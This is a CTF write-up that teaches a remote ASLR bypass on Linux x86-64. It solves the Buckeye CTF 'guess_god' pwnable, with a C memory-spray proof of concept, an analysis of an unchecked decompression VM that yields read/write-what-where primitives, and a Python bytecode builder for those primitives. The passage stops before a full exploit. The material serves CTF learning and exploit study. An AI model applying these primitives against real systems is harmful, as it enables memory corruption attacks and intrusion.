# Breaking 64 bit aslr on Linux x86-64

In this article, I'll discuss about the application of the technique described by [Samuel Groß](https://twitter.com/5aelo) in his [Remote iPhone Exploitation Part 2: Bringing Light into the Darkness -- a Remote ASLR Bypass](https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html), to bypass ASLR on Linux x86_64. 

To show this I'm gonna solve a pwnable challenge from [Buckeye CTF](https://ctf.osucyber.club/), guess_god.

I'll try to keep the content as beginner friendly as possible, so feel free to skip any section if you feel confident enough and just want to see the exploit.

# 0. Introduction
<p align="center"><img src="./images/intro-chall-description.png"></p><br/>

I didn't play the CTF, but I got interested in the challenge about 2hrs before the ctf end thanks to [Guray00](https://github.com/Guray00), who was asking for help in [fibonhack](https://twitter.com/fibonhack) discord about some crypto shenanigans. 

I couldn't help him, but I took a look at pwnable challenges, and figured it would be good to understand the P0 blogpost and hopefully get that bounty.

# 1. ASLR and how to bypass it

## 1.1 What is ASLR?
**Address Space Layout Randomization** (ASLR) is a computer security technique which involves **randomly positioning** the base address of an executable and the position of libraries, heap, and stack, in a process's address space.

## 1.2 ASLR on Linux

On linux, you can inspect the mappings of a process given its pid through [procfs](https://www.kernel.org/doc/Documentation/filesystems/proc.txt), by reading the file `/proc/<pid>/maps`.

If you are a process and you want to know your own memory mappings, you can read `/proc/<pid>/maps`.

For example, you can try to read `/proc/self/maps` with `cat`:

```
root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
55faeb01c000-55faeb01e000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
55faeb01e000-55faeb023000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
55faeb023000-55faeb026000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
55faeb026000-55faeb027000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
55faeb027000-55faeb028000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
55faeb115000-55faeb136000 rw-p 00000000 00:00 0                          [heap]
7fe15dfb1000-7fe15dfd5000 rw-p 00000000 00:00 0
7fe15dfd5000-7fe15dffb000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15dffb000-7fe15e166000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e166000-7fe15e1b2000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b2000-7fe15e1b5000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b5000-7fe15e1b8000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7fe15e1b8000-7fe15e1c3000 rw-p 00000000 00:00 0
7fe15e1c7000-7fe15e1c8000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1c8000-7fe15e1ef000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1ef000-7fe15e1f9000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1f9000-7fe15e1fb000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fe15e1fb000-7fe15e1fd000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7fff4388f000-7fff438b0000 rw-p 00000000 00:00 0                          [stack]
7fff43989000-7fff4398d000 r--p 00000000 00:00 0                          [vvar]
7fff4398d000-7fff4398f000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
55ffc0b1b000-55ffc0b1d000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
55ffc0b1d000-55ffc0b22000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
55ffc0b22000-55ffc0b25000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
55ffc0b25000-55ffc0b26000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
55ffc0b26000-55ffc0b27000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
55ffc2108000-55ffc2129000 rw-p 00000000 00:00 0                          [heap]
7f1ec6e0f000-7f1ec6e33000 rw-p 00000000 00:00 0
7f1ec6e33000-7f1ec6e59000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec6e59000-7f1ec6fc4000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec6fc4000-7f1ec7010000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7010000-7f1ec7013000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7013000-7f1ec7016000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
7f1ec7016000-7f1ec7021000 rw-p 00000000 00:00 0
7f1ec7025000-7f1ec7026000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7026000-7f1ec704d000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec704d000-7f1ec7057000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7057000-7f1ec7059000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7f1ec7059000-7f1ec705b000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
7ffc72fa4000-7ffc72fc5000 rw-p 00000000 00:00 0                          [stack]
7ffc72fe7000-7ffc72feb000 r--p 00000000 00:00 0                          [vvar]
7ffc72feb000-7ffc72fed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

### Memory mappings patterns

If you do this a couple of times, you could deduce that:
* The binary PIE base should be in the range 0x00005500_00000000-0x00005700_00000000, which means 2TB of possible addresses.
* The heap is near the binary.
* Libraries fall in the range 0x00007f00_00000000 - 0x00007fff_ffffffff, 1TB of possible addresses.
* Stack goes \(most of the time\) in the range 0x00007ffc_00000000 - 0x00007fff_ffffffff, 16gb of possible addresses.
* The range 0xffffffffff600000 - 0xffffffffff601000 is always mapped, you can read [this article](http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso) if you are curious about what it is.

## 1.3 How to bypass ASLR without an infoleak

Let's discuss what you can do to bypass ASLR when no information leak is possble.

This is my attempt to summarize what I got from reading Saelo's blogpost.

To bypass ASLR you need:
* A memory spraying technique, which lets you map contiguous memory of a given size, on a given range of addresses.
  
  As [he says](https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html#:~:text=By%20abusing%20a%20memory%20leak%20(not%20an%20information%20leak!)%2C%20a%20bug%20in%20which%20a%20chunk%20of%20memory%20is%20%E2%80%9Cforgotten%E2%80%9D%20and%20never%20freed%2C%20and%20triggering%20it%20multiple%20times%20until%20the%20desired%20amount%20of%20memory%20has%20been%20leaked.) there are two ways of doing it:
  1. By abusing a memory leak (not an information leak!), a bug in which a chunk of memory is “forgotten” and never freed, and triggering it multiple times until the desired amount of memory has been leaked.
  2. By finding and abusing an “amplification gadget”: a piece of code that takes an existing chunk of data and copies it, potentially multiple times, thus allowing the attacker to spray a large amount of memory by only sending a relatively small number of bytes.
* An `isAddressMapped` oracle, which given an address tells you wheter or not that address is mapped.

To 
```python

def find_mapped_address(a, b , sizeOfSpray):
  for probeAddr in range(a, b, sizeOfSpray):
    if isAddrMapped(probeAddr) == True:
      print (f"Found mapped address: {probeAddr:#x}")
      return probeAddr

```

for a total of `numOfQueries = (b - a + 1) // sizeOfSpray` queries to the oracle in the worst case.


### PoC of ASLR bypass on Linux

On Linux, it is possible to completely break ASLR if you are able to allocate 16TB of memory.

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    // 64gb
    size_t size = 0x1000000000;

    // 16TB allocations
    for (int i = 0; i < 256; i++) {
        void *mem = malloc(size); // this actually calls mmap because size is big
        if (!mem) {
            puts("Failed");
            return 1;
        }
        printf("%p\n", mem);
    }

    unsigned int *mem = (void*)0x7f0000000000ULL;
    *mem = 0x41414141;
    printf("R/W to %p: %x\n", mem, *mem);

    return 0;
}
```

If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.

| mem | boundary cross
| - |-
|0x7fb03b55e010| No
|0x7fa03b55d010| No
|0x7f903b55c010| No
|0x7f803b55b010| No
|0x7f703b55a010| No
|0x7f603b559010| No
|0x7f503b558010| No
|0x7f403b557010| No
|0x7f303b556010| No
|0x7f203b555010| No
|0x7f103b554010| No
|0x7f003b553010| No
|0x7ef03b552010| Yes
|0x7ee03b551010| Yes
|0x7ed03b550010| Yes
|0x7ec03b54f010| Yes

The poc is exploiting the fact that, at some point, the most significant byte of the address returned changes from 7F to 7E.

# 2 The challenge

Thankfully to the author, the zip contains binaries, source code and dockerfile to reproduce the same environment as the remote one.

<p align="center"> <img src="./images/intro-dist-files.png" width="50%"><p/> <br/>

## 2.1 Initial foothold

It's always a good thing to grasp some knowledge about the environment, let's scroll through the files and take some notes.

* jail.cfg set some restrictions, let's not forget about those limits since they might screw up the exploit:
  ```yaml
  time_limit: 300
  cgroup_cpu_ms_per_sec: 100
  cgroup_pids_max: 64
  rlimit_fsize: 2048
  rlimit_nofile: 2048
  cgroup_mem_max: 1073741824 # 1GB
  ```

* From the Dockerfile we can learn some interesting things:
  1. Build and install oatpp 1.2.5, maybe there are useful bugs in this specific version?
     ```Docker
     # Install oatpp
     RUN git clone https://github.com/oatpp/oatpp.git
     RUN cd /oatpp && git checkout 1.2.5 && mkdir build && cd build && cmake .. && make install
     ```
  
  2. It builds the challenge from scratch
     ```docker
     WORKDIR /home/ctf/challenge/src/
     RUN mkdir -p src/build && cd src/build && cmake .. && make
     RUN cp src/build/flag_server-exe src/build/libkylezip.so flag.txt /   home/  ctf/challenge/
     ```
     This might be a problem, so let's copy the distribuited binaries  instead.
     ```docker
     COPY bins/flag_server-exe /home/ctf/challenge/
     COPY bins/libkylezip.so /home/ctf/challenge/
     ```
* And the last thing, check the protections of the binaries provided
  <p align="center"> <img src="./images/checksec.png"><br/> <i></i></p>
  Sweet, libkylezip.so is compiled with Partial RELRO, that means that the GOT is writable, keep that in mind for when we want to get code execution.

## 2.2 Setup the local environment and poke the application

docker-compose.yml file is provided so it is not hard at all to get a working local environment to poke. For those of you that are not confident with docker here is the list of commands you need to know to poke the challenge locally.

```bash
docker-compose build # Build the image, do this whenever you change something
docker-compose up # start the container
docker-compose down # stop the container

docker ps # list containers
docker exec -it <CONTAINER ID> <COMMAND> # exec COMMAND into the container
```

After doing `docker-compose build` you can execute `docker-compose up` to start the container, and connect to the challenge with `nc 127.0.0.1 9000`
<p align="center"> <img src="./images/docker-up-nc.png" ><br/> <i></i><p/> 

# 3. Source code analysis

Now that we have some basic knowledge about what we should do in order to bypass ASLR, let's look at the source code, keeping in mind that we want to:
* a way to spray memory in known ranges of memory
* an isAddrMapped oracle

<p align="center"> <img src="./images/source-code-folder.png" width="50%"><br/> <i> Source code folder </i><p/> 

It's mostly glue code to get an oatpp web server up and running, in fact the important files which we are gonna analyze are:
* src/controller/MyController.*
* kylezip/decompress.*

## 3.1 MyController

<p align="center"> <img src="./images/MyControllerHpp.png"><br/> <i>MyController.hpp</i><p/> 

There are 3 endpoints:
* `/`
* `GET /files/{fileId}` -> Download a previously uploaded file, if extract is true extract before downloading it.
* `POST /upload/{fileId}` -> Upload a file given a {fileId}.

And one function implemented in `MyController.cpp`
```C
std::shared_ptr<oatpp::base::StrBuffer> MyController::get_file(int file_id, bool extract) 
``` 
which:
* Set `to_open` to `{file_id}` or `{file_id}.unkyle`
  ```C
  std::ostringstream comp_fname;
  comp_fname << filename;
  if (extract) {
    // Want the un-kylezip-d version
    comp_fname << ".unkyle";
  }
  auto to_open = comp_fname.str();
  ```

* If it's the first time we are requesting to extract `{file_id}` then it calls decompress on it,
  which will write the decompressed file of `{file_id}` to `{file_id}.unkyle`.
  ```C
  int fd = open(to_open.c_str(), O_RDONLY);
  if (fd == -1) {
      if (!extract) return NULL;

      /* Need to create decompressed version of file
       * Kyle gave me a buggy library so we are going to fork
       * in case we crash the web server will still stay up.
       */
      pid_t p = fork();
      if (p == 0) {
        decompress(filename);
        exit(0);
      } else {
        waitpid(p, NULL, 0);
      }


      fd = open(to_open.c_str(), O_RDONLY);
      if (fd == -1) {
        return NULL;
      }
  }
  ```

* In the end `mmap` the result in memory.
  ```C
  struct stat sb;
  
  if (fstat(fd, &sb) != 0) {
      return NULL;
  }
  
  /* mmap the file in for performance, or something... idk kyle made me write this */
  // 
  void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  ```

### Observations

* [fork()](https://man7.org/linux/man-pages/man2/fork.2.html) creates a new process by duplicating the calling process, at the time of fork() both memory spaces have the same content.

  So if we are able to turn decompress() to an oracle which:
  * Crashes on bad addresses
  * Doesn't crash on nice addresses

  We could use that primitive to infer the memory space of the parent.

* There is a call to `mmap` in the parent process:
  ```C
  void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  
  ``` 
  if we can control `sb.st_size`, which is the size of the decompressed file, we could easily turn it into a memory spraying primitive.

## 3.1 decompress

This is what gets compiled into `libkayle.so`, here it is an overview of what it does.

```C
int decompress(const char *fname)
```

* Map the input file to the address `0x42069000000`.
* Map the output file to the address `0x13371337000`.
* Calls do_decompress() which gets the decompression done.

```C
static void do_decompress(char *out, char *in, size_t insize)
```
You can view this function as a simple *virtual machine*, which executes the bytecode `in` and writes the output to `out`.

This VM has 4 opcodes:
* 0 -> NOP.
* 
* 1 -> STORE(u8 b). 
  
  writes `b` to `out`, increments out by `1`.
  
  Implementation:
  ```C
  case 1: {
      // Write byte
      uint8_t b = in[cur++];
      *(out++) = b;
      break;
  }
  ```   

* 2 -> SEEK(u64 off):
  set `out` to `out + off`. 
  
  `out` and `off` are 64 bit values, so `out = out+off` is equivalent to `out = (out+off) % MAX_64BIT_VALUE`, this is called `integer overflow` and we can exploit this behaviour to always reach any 64 bit value. Example:
  ```py
  M64 = 0xFFFFFFFF_FFFFFFFF # maximum 64 bit value
  def get_off(out: int, target: int):
    return (target - out) % M64
  
  # We are at 0xffffffff, what can we add to reach 0?
  print ('{:#x}'.format(get_off(0xffffffff, 0)))
  # Try it yourself :)
  ```

  Implementation:
  ```C
  case 2: {
    // Seek
    uint64_t off = *(uint64_t*)(&in[cur]);
    cur += sizeof(off);
    out += off;
    break;
  }
  ``` 

* 3 -> LOAD(off, size). 
  Copy `size` bytes from `out - off` to `out`, increment `out` by 8.

  Implementation:
  ```C
  case 3: {
    // Copy some previously written bytes
    uint64_t off = *(uint64_t*)(&in[cur]);
    cur += sizeof(off);
    uint64_t count = *(uint64_t*)(&in[cur]);
    cur += sizeof(off);
    memcpy(out, out-off, count);
    out += count;
    break;
  }
  ```

There are no bounds check in any of the operation, that gives us 2 useful primitives:
* Read What Where, abusing `SEEK+LOAD`
* Write What Where: abusing `SEEK+STORE`

I used this code to build the bytecode:
```py
IN_ADDR = 0x42069000000 # PROT R
OUT_ADDR = 0x13371337000 # PROT RW
M64 = (1<<64)-1

class CompressedFile():
    __slots__ = ['cur', 'content', 'out']

    def __init__(self, filesize):
        self.cur = 16
        self.content = b''
        self.content += p64(0x0123456789abcdef) # magic
        self.content += p64(filesize) # file size
        self.out = OUT_ADDR

    def nop(self):
        self.content += b'\x00' # cmd0
        self.cur += 1

    def write(self, b: bytes):
        assert len(b) == 1

        self.content += b'\x01' + b # cmd1 + byte
        self.cur += 2
        self.out += 1 & M64

    def seek(self, off):
        self.content += b'\x02' # cmd2
        self.content += p64(off) # offset
        self.cur += 9
        self.out += off & M64

    def memcpy(self, off, count):
        # memcpy(out, out-off, count);
        self.content += b'\x03' # cmd33
        self.content += p64(off) # offset
        self.content += p64(count) # offset
        self.cur += 17
        self.out += count & M64
```
## 4 Poking the challenge

## 4.1 Inspect the memory on the challenge
To do this, spawn a local instance of the challenge and read the process maps. That was my setup for the ctf:

<p align="center"> <img src="./images/read-proc-mappings.png" ><br/> <i></i><p/> 

### Linear scan the stack

Let's try to target the stack range 0x00007fff_00000000 - 0x00007fff_ffffffff, because it is the smaller
```py
def getNumberOfQueries(a, b, size):
    return (b - a + 1) // size

a = 0x00007f00_00000000
b = 0x00007fff_ffffffff


size = 0x00000001_00000000 # 4gb of contiguous allocation
print (getNumberOfQueries(a, b, size)) # 256
```

Ok, that's good, we can find a mapped address with just 256 queries!
Let's try to visualize what is happening:

| probeAddr    | |
| -  | - | 
| 7f00_00000000| +4gb
| 7f01_00000000| +4gb
| 7f02_00000000| +4gb
| ...|
| 7fff_00000000|

We are basically bruteforcing the 5th byte of the address, exploiting the fact that there must be a contiguous range of memory which is 4gb long. Don't worry if that's not clear enough for now, we're gonna try this on a real target.

